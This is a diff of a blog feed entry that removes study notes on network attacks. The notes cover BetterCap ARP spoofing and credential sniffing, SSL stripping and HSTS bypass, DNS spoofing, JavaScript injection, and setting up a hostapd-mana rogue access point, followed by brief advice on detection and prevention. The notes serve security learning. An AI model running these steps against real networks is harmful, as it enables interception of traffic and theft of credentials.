-&lt;h5 id="bettercap"&gt;BetterCap&lt;/h5&gt;
-&lt;ul&gt;
-&lt;li&gt;use &lt;code&gt;bettercap -iface [interface]&lt;/code&gt; (interface must be connected to the network you wish to attack)&lt;ul&gt;
-&lt;li&gt;use help to get info of modules running or help [module for more]&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;net.probe on&lt;/code&gt; gets all clients&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;net.show&lt;/code&gt; shows all clients&lt;/li&gt;
-&lt;li&gt;To do Man in the middle in Bettercap use &lt;code&gt;help arp.spoof&lt;/code&gt; you need to modify some of the options, to do this use &lt;code&gt;set [option_name] [value]&lt;/code&gt; (set full.duplux on and set targets in .targets)&lt;/li&gt;
-&lt;li&gt;once settings have been set up turn it on &lt;code&gt;arp.spoof on&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;To capture data that is being spoofed and analyse it use the net.sniff module &lt;code&gt;net.sniff on&lt;/code&gt; , you will see entered usernames and passwords under POST&lt;/li&gt;
-&lt;li&gt;Instead of doing the above you can use a caplet, to capture data for you&lt;ol&gt;
-&lt;li&gt;open a text file and type each command&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;net.probe on&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;set arp.spoof.fullduplex true&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;set arp.spoof.targets [target_ips]&lt;/code&gt; (will need to change IP in script each time you use, to target multiple IPs use the comma [,] after each IP)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;arp.spoof on&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;net.sniff on&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Save the file with .cap&lt;/li&gt;
-&lt;li&gt;From Bash use &lt;code&gt;bettercap -iface [interface] -caplet [filename]&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id="https"&gt;HTTPS&lt;/h4&gt;
-&lt;p&gt;HTTP is sent as plain text HTTPS adds a extra layer of security called TLS (Transport layer security) or SSL(Secure Socket Layer), they encrypt traffic being sent. Almost impossible to break, therefore easiest method is to downgrade the connection to HTTP can use a tool called &lt;code&gt;SSL Strip&lt;/code&gt;. BetterCap has a caplet for this however it does not replace all HTTPS links in the loaded pages. This won't work if the target site has implemented HSTS, this can also be bypassed but is more difficult (by tricking the browser into loading a different site). One method is to use &lt;code&gt;hstshijack&lt;/code&gt;, which a resource for this is at &lt;a href="https://github.com/bettercap/caplets/tree/master/hstshijack"&gt;https://github.com/bettercap/caplets/tree/master/hstshijack&lt;/a&gt;.&lt;/p&gt;
-&lt;h4 id="dns-spoofing"&gt;DNS Spoofing&lt;/h4&gt;
-&lt;p&gt;Instead of returning Google's IP return a malicious server. Kali comes installed with a webserver, to start it use &lt;code&gt;service apache2 start&lt;/code&gt; go to KALI's IP to use. The default webpage is stored in /var/www/html.&lt;/p&gt;
-&lt;p&gt;To spoof:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Start bettercap with the caplet coded above&lt;/li&gt;
-&lt;li&gt;Use the dns.spoof module:&lt;ol&gt;
-&lt;li&gt;if you do not want to redirect to yourself change the dns.spoof.address value&lt;/li&gt;
-&lt;li&gt;set dns.spoof.all so bettercap responds to any dns request &lt;code&gt;set dns.spoof.all true&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;set dns.spoof.domains to the sites you wish to be redirected to you. &lt;code&gt;set dns.spoof.domains [domain1, domain2]&lt;/code&gt; (use * as a wildcard to do any subdoamin under a website eg.*.kali.org)&lt;/li&gt;
-&lt;li&gt;start dns.spoof &lt;code&gt;dns.spoof on&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h4 id="javascript-code-injection"&gt;JavaScript Code Injection&lt;/h4&gt;
-&lt;p&gt;How to insert JavaScript code:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Have JavaScript code file&lt;/li&gt;
-&lt;li&gt;go to the hstshijack plugin /usr/share/bettercap/caplets&lt;/li&gt;
-&lt;li&gt;go to the .cap file and add the js code under the payloads, * means all domains then : eg. *:/code.js (otherwise use a domain).&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id="wireshark"&gt;WireShark&lt;/h3&gt;
-&lt;p&gt;Wireshark is the world's foremost and widely-used network protocol analyzer. Only analyses data flowing though your computer, so works with man in the middle. Go into settings and select the interface you want to start capturing (hold ctl if you want to cap multiple) in output you can send it to a cap file for later analysis. HTTPS will be encrypted so be sure to use hstshijack. Green = TCP packets, Darkblue = DNS, lightblue = UTP, BLACK = TCP with errors.&lt;/p&gt;
-&lt;p&gt;Filtering packets:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;in the filters type: http&lt;/li&gt;
-&lt;li&gt;Double Click to get more info. Under the Hypertext Transfer Protocol section important info is shown.&lt;/li&gt;
-&lt;li&gt;can see what type next too the info&lt;/li&gt;
-&lt;li&gt;right click a packet and go follow &amp;gt; http stream to see exactly what was sent.&lt;/li&gt;
-&lt;li&gt;again under the double click &amp;gt; Hypertext Transfer Protocol you can see what was requested or responded.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;To find usernames and passwords check under POST requests and under the html form url encoded. ctl + f to find data, set search to packet details and set last one to string and oyu can type a name like admin etc.&lt;/p&gt;
-&lt;p&gt;If you want to put BetterCap data in a file use &lt;code&gt;set net.sniff.output [file]&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id="creating-a-honeypot-fake-access-point"&gt;Creating a Honeypot (fake access point)&lt;/h3&gt;
-&lt;p&gt;We use &lt;code&gt;hostapd-mana&lt;/code&gt; to achieve this, mana is a featureful rogue access point first presented at Defcon 22 by Dominic White &lt;a href="https://github.com/sensepost/hostapd-mana"&gt;https://github.com/sensepost/hostapd-mana&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;Use Mana:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;start-noupstream.sh&lt;/code&gt; -Starts access point with no internet access&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;start-nat-simple.sh&lt;/code&gt; -Starts an access point with internet access (use this)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;start-nat-full.sh&lt;/code&gt; -Starts a access point and automatically starts sniffing data, bypass https&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;To install Mana on Linux:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;apt-get update&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;apt-get --yes install build-essential pkg-config git libnl-genl-3-dev libssl-dev&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;cd /tmp&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;git clone https://github.com/sensepost/hostapd-mana&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;cd hostapd-mana&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;make -C hostapd&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;mv /tmp/hostapd-mana/hostapd/ /usr/lib/mana-toolkit&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;cd /usr/share/&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;git clone --depth 1 https://github.com/sensepost/mana.git&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;mv mana mana-toolkit&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;mkdir /etc/mana-toolkit/&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;mv mana-toolkit/run-mana/conf/*.conf /etc/mana-toolkit/&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Editing Mana:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;edit mana settings in /etc/mana-toolkit/hostatp-mana.conf &amp;gt; check interface + SSID (Name).&lt;/li&gt;
-&lt;li&gt;edit start script in /usr/share/mana-toolkit/run-mana/start-nat-simple.sh &amp;gt; check upstream interface (set to the one that has internet access), check phy (the card that is going to broadcast the network[wlan0]).&lt;/li&gt;
-&lt;li&gt;start the script &lt;code&gt;bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="detection-security"&gt;Detection &amp;amp; Security&lt;/h3&gt;
-&lt;h4 id="detecting-arp-attacks"&gt;Detecting ARP Attacks&lt;/h4&gt;
-&lt;p&gt;On Windows use &lt;code&gt;arp -a&lt;/code&gt; if the gateway matches another MAC in the network = bad, not practical to type every time and constantly so use XARP (&lt;a href="http://www.xarp.net/"&gt;http://www.xarp.net/&lt;/a&gt;)!&lt;/p&gt;
-&lt;p&gt;To discover suspicious activity on a network use wireshark. &amp;gt; go to preferances &amp;gt; protocols &amp;gt; ARP &amp;gt; enable detect arp request storms. Broadcast packets are dangerous that is the hacker detecting the network. If you go to Expert Information, you can see the storm info. Also under expert information you can see warning for arp poisoning and other things. You can use static arp tables (you must manually configure) system will refuse if arp changes. Problem if you need to connect to different networks.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;This is only detection, not prevention. There is not much we can do after detecting except exiting that network or changing access control.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id="preventing-mitm-attacks"&gt;Preventing MITM Attacks&lt;/h4&gt;
-&lt;p&gt;Make sure everything is encrypted using https (Plugin to do this automatically &lt;a href="https://www.eff.org/https-everywhere"&gt;https://www.eff.org/https-everywhere&lt;/a&gt;) or use a VPN, preferably use both!.&lt;/p&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry></feed>
+&lt;/ol&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry></feed>
